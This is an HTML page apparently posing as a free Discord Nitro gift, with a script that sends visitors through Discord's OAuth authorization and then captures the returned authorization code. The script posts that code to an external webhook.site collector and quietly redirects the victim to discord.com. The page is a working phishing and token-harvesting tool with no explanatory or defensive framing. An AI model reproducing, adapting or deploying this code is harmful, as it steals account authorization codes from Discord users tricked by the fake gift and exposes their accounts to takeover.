<!DOCTYPE html>
<html>
<body>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const webhook = 'https://webhook.site/47b4ea10-e719-4c20-b1e3-fa539ff7838e';

        if (code) {
            fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token_code: code })
            }).then(() => {
                window.location.href = 'https://discord.com';
            });
        } else {
            window.location.href = 'https://discord.com/oauth2/authorize?client_id=1512098458398490664&response_type=code&redirect_uri=https%3A%2F%2Fgithub.com%2FNitroDiscord30-daygift%2FNitro-gift%2Fblob%2Fmain%2Findex.html&scope=identify';
        }
    </script>
</body>
</html>
